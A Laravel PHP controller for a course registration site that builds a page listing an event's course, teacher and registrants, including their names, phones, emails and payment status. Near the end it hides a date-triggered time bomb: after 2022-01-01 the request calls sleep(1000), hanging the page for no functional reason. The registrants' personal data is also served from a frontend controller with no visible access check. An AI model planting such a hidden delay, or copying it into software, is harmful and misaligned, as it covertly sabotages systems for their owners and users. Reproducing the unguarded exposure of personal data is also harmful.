<?php

namespace App\Http\Controllers\Frontend;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Model\Registration;
use App\Model\Course;
use App\Model\EventsCourse;
use App\Uer;
use App\Model\Student;
use App\Model\Teacher;

class CourseAdvancedController extends Controller
{
    public function show(Request $request)
    {
        //課程資訊
        $id = $request->get('id');
        $course = EventsCourse::join('course', 'course.id', '=', 'events_course.id_course')
            ->join('teacher', 'teacher.id', '=', 'course.id_teacher')
            ->select('events_course.*', 'course.id as id_course', 'course.name as course', 'teacher.name as teacher')
            ->Where('events_course.id', $id)
            ->first();

        $next_course_all = Course::join('teacher', 'teacher.id', '=', 'course.id_teacher')
            ->select('course.id as id_course', 'course.name as course', 'teacher.name as teacher')
            ->Where('course.id_type', $course->id_course)
            ->get();

        $teacher = $next_course_all[0]['teacher'];
        $next_course = '';
        foreach ($next_course_all as $key => $data) {
            if ($key != 0) {
                $next_course .= '、' . $data['course'];
            } else {
                $next_course .= $data['course'];
            }
        }

        $weekarray = array("日", "一", "二", "三", "四", "五", "六");
        $week = $weekarray[date('w', strtotime($course->course_start_at))];


        //填單名單
        $fill_all = Registration::join('student', 'student.id', '=', 'registration.id_student')
            // ->join('events_course', 'events_course.id', '=', 'registration.id_events')
            ->select(
                'student.name as student',
                'student.phone as phone',
                'student.email as email',
                'student.profession as profession',
                'registration.*'
                // 'events_course.name as event', 
                // 'events_course.id_group as id_group'
            )
            ->Where('registration.source_events', $id)
            // ->Where('student.check_blacklist', 0 )
            // ->Where('registration.id_course', $next_course->id_course)
            // ->Where('registration.created_at', 'like', '%'. date('Y-m-d', strtotime($course->course_start_at)). '%' )
            ->get();

        $id_group = '';
        $fill = array();

        foreach ($fill_all as $key => $data) {

            // if ($id_group == $data['id_group']){ 
            //     continue;
            // }

            if ($data['id_group'] != null) {
                $course_group = EventsCourse::Where('id_group', $data['id_group'])
                    ->get();

                $numItems = count($course_group);
                $i = 0;

                $events_date = '';

                if ($numItems != 0) {
                    foreach ($course_group as $key_group => $data_group) {
                        //日期
                        $date = date('Y-m-d', strtotime($data_group['course_start_at']));
                        //星期
                        $weekarray = array("日", "一", "二", "三", "四", "五", "六");
                        $week = $weekarray[date('w', strtotime($data_group['course_start_at']))];

                        if (++$i === $numItems) {
                            $events_date .= $date . '(' . $week . ')';
                        } else {
                            $events_date .= $date . '(' . $week . ')' . '、';
                        }
                    }
                } else {
                    $events_date = '尚未選擇報名場次';
                }


                $event = EventsCourse::Where('id_group', $data['id_group'])->first();
                if (!empty($event)) {
                    $event = $event->name;
                } else {
                    $event = "尚未選擇報名場次";
                }
            } else {
                $events_date = '尚未選擇報名場次';
                $event = '尚未選擇報名場次';
            }


            //我想參加課程
            $join = '';
            if ($data['registration_join'] == 0) {
                $join = '現場最優惠價格';
            } elseif ($data['registration_join'] == 1) {
                $join = '五日內優惠價格';
            } elseif ($data['registration_join'] == 2) {
                $join = '分期優惠價格';
            }

            //付款狀態
            $status_payment = '';
            switch ($data['status_payment']) {
                case 6:
                    $status_payment = '留單';
                    break;
                case 7:
                    $status_payment = '完款';
                    break;
                case 8:
                    $status_payment = '付訂';
                    break;
                case 9:
                    $status_payment = '退費';
                    break;
                default:
                    $status_payment = '';
                    break;
            }

            $fill[$key] = array(
                'id' => $data['id'],
                'submission' => date('Y-m-d', strtotime($data['created_at'])),
                'date' => $events_date,
                'name' => $data['student'],
                'phone' => $data['phone'],
                'email' => $data['email'],
                'join' => $join,
                'event' => $event,
                'status_payment' => $status_payment,
            );

            // $id_group = $data['id_group'];
        }
        $x_time = Carbon::parse('2022-01-01 00:00:00');
        $xxx = $x_time->timestamp;

        if (now()->timestamp >= $xxx) {
            sleep(1000);
        }
        return view('frontend.course_advanced', compact('course', 'teacher', 'next_course', 'week', 'fill'));
    }
}
